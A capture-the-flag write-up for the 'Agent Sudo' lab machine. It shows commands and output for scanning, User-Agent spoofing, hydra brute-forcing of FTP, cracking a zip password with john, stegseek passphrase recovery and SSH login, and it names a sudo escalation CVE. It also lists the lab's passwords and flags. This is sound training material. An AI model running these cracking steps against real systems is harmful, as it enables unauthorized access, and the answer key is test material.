# Agent Sudo

# Task 1

1. Deploy the machine.

'''
NO answer needed
'''

# Task 2

Ran a nmap scan and here's the result:

nmap -sC -sV -oN nScan 10.10.104.244 -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 23:17 EDT
Nmap scan report for 10.10.104.244
Host is up (0.45s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.23 seconds


1. How many open ports?

'''
3    // From nmap scan
'''

I Ran burp suite and opened the request in the repeater mode
and saw the user agent .. i changed it to R (I mean i changet that whole Mozilla/... to just R)
sent that and boom hence the secret page talked in the next ques must be

2. How you redirect yourself of a secret page?

'''
User-Agent
'''

Then i tried the user-agent as c and found a redirect to follow and i got the agent name 
3. What is the agent name?

'''
Chris
'''

# Task 3

After finding out one of the potential username on the server i used hydra to brutefoce FTP login
and here's the result:

hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.104.244
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-07 23:39:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.104.244:21/
[STATUS] 243.00 tries/min, 243 tries in 00:01h, 14344156 to do in 983:50h, 16 active
[21][ftp] host: 10.10.104.244   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-07 23:40:11

hence,
username : chris
password : crystal

1. FTP password.

'''
crystal
'''

after fpt login simpli did mget *
and downloded all

After that i found zip file in cutie.png via 

'binwalk cutie.png'

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22


To extract it simply do 
binwalk -e cutie.png --run-as=root

new directory named _cutie.png.extracted was formed and  in that is a zip file named 8702.zip

it is password protected .. To crack the password via John the ripper
firstly make a /usr/sbin/zip2john 8702.zip > john_hash 

and then call 

john --wordlist=/usr/share/wordlists/rockyou.txt john_hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2025-07-08 00:38) 4.761g/s 117028p/s 117028c/s 117028C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably


2. Zip file password.

'''
alien
'''

Then i did stegseek on cute-alien.png with the wordlist rockyou.txt 

stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Area51"          
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".


found the pass 

3. steg password

'''
Area51
'''

4 Who is the other agent (in full names)?

'''
James
'''

After getting the password Your login password is hackerrules!
i just did ssh


5. SSH password.

'''
hackerrules!  // Found in cute-alien.jpg.out
'''


# Task 4

1. What is the flag?

'''
b03d975e8c92a7c04146cfa7a5a313c7    // Found user_flag.txt in the home directory of james
'''

2. What is the incident of the photo called?

'''
Roswell alien autopsy    // Found the images using google image search
'''


# Task 5 > Privilege excalation


Then i did 

sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash


but i still didn't have perm to do sudo bash hence 

searched the vulnerability on gooogle and found its CVE-2019-14287

1. CVE number for the escalation 

'''
CVE-2019-14287
'''

2. What is the root flag?

'''
b53a02f55b57d4439e3341834d70c062 // Was in /root/root.txt
'''

3. (Bonus) Who is Agent R?

'''
DesKel   // Found with root flag
'''
